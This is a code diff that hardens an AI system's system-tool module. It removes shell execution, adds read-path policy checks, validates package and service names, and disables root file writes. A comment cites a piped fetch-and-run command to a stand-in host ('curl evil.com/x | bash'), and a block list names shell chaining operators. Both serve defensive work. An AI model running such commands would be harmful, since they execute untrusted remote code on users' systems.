@@ -8,13 +8,22 @@ from __future__ import annotations
 
 import os
 import platform
+import shlex
 import shutil
 import subprocess
 from pathlib import Path
 
+from ..fs_policy import check_read
+
 # Maximum bytes we will read back from a file / command output so we never
 # blow up the model context window.
 _MAX_OUTPUT = 16000
+
+# Shell metacharacters that enable chaining / redirection / substitution.
+# We run everything with shell=False, so a command containing these is almost
+# always an attempt to do something the argv model can't express safely
+# (e.g. `curl evil.com/x | bash`). We reject them with a clear message.
+_SHELL_METACHARS = ("|", "&", ";", ">", "<", "`", "$(", "${", "&&", "||", "\n")
 
 
 def _truncate(text: str, limit: int = _MAX_OUTPUT) -> str:
@@ -24,11 +33,12 @@ def _truncate(text: str, limit: int = _MAX_OUTPUT) -> str:
     return text[:half] + "\n...[truncated]...\n" + text[-half:]
 
 
-def _run(argv: list[str] | str, shell: bool = False, timeout: int = 120) -> dict:
+def _run(argv: list[str], timeout: int = 120) -> dict:
+    """Run a command from an argv list with shell=False (no shell parsing)."""
     try:
         proc = subprocess.run(
             argv,
-            shell=shell,
+            shell=False,
             capture_output=True,
             text=True,
             timeout=timeout,
@@ -42,6 +52,8 @@ def _run(argv: list[str] | str, shell: bool = False, timeout: int = 120) -> dict
     except subprocess.TimeoutExpired:
         return {"ok": False, "error": f"Command timed out after {timeout}s"}
     except FileNotFoundError as exc:
+        return {"ok": False, "error": str(exc)}
+    except OSError as exc:
         return {"ok": False, "error": str(exc)}
 
 
@@ -96,8 +108,10 @@ def system_info() -> dict:
 
 
 def read_file(path: str, max_bytes: int = _MAX_OUTPUT) -> dict:
+    allowed, reason, p = check_read(path)
+    if not allowed:
+        return {"ok": False, "error": reason}
     try:
-        p = Path(os.path.expanduser(path))
         if not p.is_file():
             return {"ok": False, "error": f"Not a file: {path}"}
         data = p.read_text(encoding="utf-8", errors="replace")
@@ -107,8 +121,10 @@ def read_file(path: str, max_bytes: int = _MAX_OUTPUT) -> dict:
 
 
 def list_directory(path: str = ".") -> dict:
+    allowed, reason, p = check_read(path)
+    if not allowed:
+        return {"ok": False, "error": reason}
     try:
-        p = Path(os.path.expanduser(path))
         if not p.is_dir():
             return {"ok": False, "error": f"Not a directory: {path}"}
         entries = []
@@ -126,11 +142,21 @@ def list_directory(path: str = ".") -> dict:
 
 
 def search_files(pattern: str, path: str = ".", max_results: int = 100) -> dict:
-    base = os.path.expanduser(path)
-    res = _run(["grep", "-rIl", "--", pattern, base], timeout=60)
+    allowed, reason, base = check_read(path)
+    if not allowed:
+        return {"ok": False, "error": reason}
+    res = _run(["grep", "-rIl", "--", pattern, str(base)], timeout=60)
     if not res.get("ok") and not res.get("stdout"):
         return {"ok": True, "matches": []}
-    matches = [m for m in res.get("stdout", "").splitlines() if m][:max_results]
+    # Drop any hit that the read policy would itself refuse.
+    matches = []
+    for m in res.get("stdout", "").splitlines():
+        if not m:
+            continue
+        if check_read(m)[0]:
+            matches.append(m)
+        if len(matches) >= max_results:
+            break
     return {"ok": True, "matches": matches}
 
 
@@ -151,48 +177,91 @@ def service_status(name: str) -> dict:
 # System-modifying tools (SENSITIVE — require confirmation)
 # --------------------------------------------------------------------------
 
+def _looks_like_shell(command: str) -> str | None:
+    """Return a reason if the command relies on shell features we don't allow."""
+    for meta in _SHELL_METACHARS:
+        if meta in command:
+            return (
+                "Shell operators (pipes, redirects, command substitution, "
+                "chaining) are not allowed in run_command for safety. Run a "
+                "single program, or use a specific tool (install_package, "
+                "write_file, service_control, ...) instead."
+            )
+    return None
+
+
+def _valid_pkg_names(packages: str) -> tuple[list[str], str | None]:
+    names = packages.split()
+    for n in names:
+        # APT names: letters, digits, + - . : (arch), ~ (versions)
+        if not all(c.isalnum() or c in "+-.:~=" for c in n):
+            return [], f"Invalid package name: {n!r}"
+    return names, None
+
+
 def run_command(command: str, use_sudo: bool = False, timeout: int = 300) -> dict:
-    """Run an arbitrary shell command. Sensitive — gated by the security guard."""
-    cmd = command
-    if use_sudo and not command.strip().startswith("sudo"):
-        cmd = "sudo -n " + command
-    return _run(cmd, shell=True, timeout=timeout)
+    """Run a single program (no shell). Sensitive — gated by the security guard."""
+    command = command.strip()
+    if not command:
+        return {"ok": False, "error": "Empty command."}
+    reason = _looks_like_shell(command)
+    if reason:
+        return {"ok": False, "error": reason}
+    try:
+        argv = shlex.split(command)
+    except ValueError as exc:
+        return {"ok": False, "error": f"Could not parse command: {exc}"}
+    if not argv:
+        return {"ok": False, "error": "Empty command."}
+    if use_sudo and argv[0] != "sudo":
+        argv = ["sudo", "-n", *argv]
+    return _run(argv, timeout=timeout)
 
 
 def install_package(packages: str, use_sudo: bool = True) -> dict:
     """Install one or more APT packages (space-separated)."""
-    pkgs = " ".join(packages.split())
-    prefix = "sudo -n " if use_sudo else ""
-    cmd = f"{prefix}env DEBIAN_FRONTEND=noninteractive apt-get install -y {pkgs}"
-    return _run(cmd, shell=True, timeout=600)
+    names, err = _valid_pkg_names(packages)
+    if err:
+        return {"ok": False, "error": err}
+    if not names:
+        return {"ok": False, "error": "No packages specified."}
+    # Full paths so the call matches the /etc/sudoers.d/rayen-ai allowlist.
+    argv = ["/usr/bin/env", "DEBIAN_FRONTEND=noninteractive",
+            "/usr/bin/apt-get", "install", "-y", *names]
+    if use_sudo:
+        argv = ["sudo", "-n", *argv]
+    return _run(argv, timeout=600)
 
 
 def remove_package(packages: str, use_sudo: bool = True) -> dict:
-    pkgs = " ".join(packages.split())
-    prefix = "sudo -n " if use_sudo else ""
-    cmd = f"{prefix}env DEBIAN_FRONTEND=noninteractive apt-get remove -y {pkgs}"
-    return _run(cmd, shell=True, timeout=600)
+    names, err = _valid_pkg_names(packages)
+    if err:
+        return {"ok": False, "error": err}
+    if not names:
+        return {"ok": False, "error": "No packages specified."}
+    argv = ["/usr/bin/env", "DEBIAN_FRONTEND=noninteractive",
+            "/usr/bin/apt-get", "remove", "-y", *names]
+    if use_sudo:
+        argv = ["sudo", "-n", *argv]
+    return _run(argv, timeout=600)
 
 
 def write_file(path: str, content: str, use_sudo: bool = False) -> dict:
-    """Create or overwrite a file with the given content."""
+    """Create or overwrite a file with the given content (user-owned paths only).
+
+    Writing files as root is intentionally NOT supported: granting that would be
+    equivalent to full root for the assistant. Editing protected system files
+    must be done by the user themselves.
+    """
+    if use_sudo:
+        return {
+            "ok": False,
+            "error": "Writing files as root is disabled for safety. Ask the user "
+                     "to edit protected system files manually, or write to a "
+                     "path you own.",
+        }
     target = os.path.expanduser(path)
     try:
-        if use_sudo:
-            # Write via tee so we can elevate without a shell redirect.
-            proc = subprocess.run(
-                ["sudo", "-n", "tee", target],
-                input=content,
-                capture_output=True,
-                text=True,
-                timeout=60,
-            )
-            return {
-                "ok": proc.returncode == 0,
-                "exit_code": proc.returncode,
-                "stderr": _truncate(proc.stderr),
-                "path": target,
-            }
         Path(target).parent.mkdir(parents=True, exist_ok=True)
         Path(target).write_text(content, encoding="utf-8")
         return {"ok": True, "path": target, "bytes": len(content.encode())}
@@ -204,5 +273,9 @@ def service_control(action: str, name: str, use_sudo: bool = True) -> dict:
     """Control a systemd service. action: start|stop|restart|enable|disable."""
     if action not in ("start", "stop", "restart", "enable", "disable"):
         return {"ok": False, "error": f"Invalid action: {action}"}
-    prefix = "sudo -n " if use_sudo else ""
-    return _run(f"{prefix}systemctl {action} {name}", shell=True, timeout=60)
+    if not name or not all(c.isalnum() or c in "-_.@:\\" for c in name):
+        return {"ok": False, "error": f"Invalid service name: {name!r}"}
+    argv = ["systemctl", action, name]
+    if use_sudo:
+        argv = ["sudo", "-n", *argv]
+    return _run(argv, timeout=60)
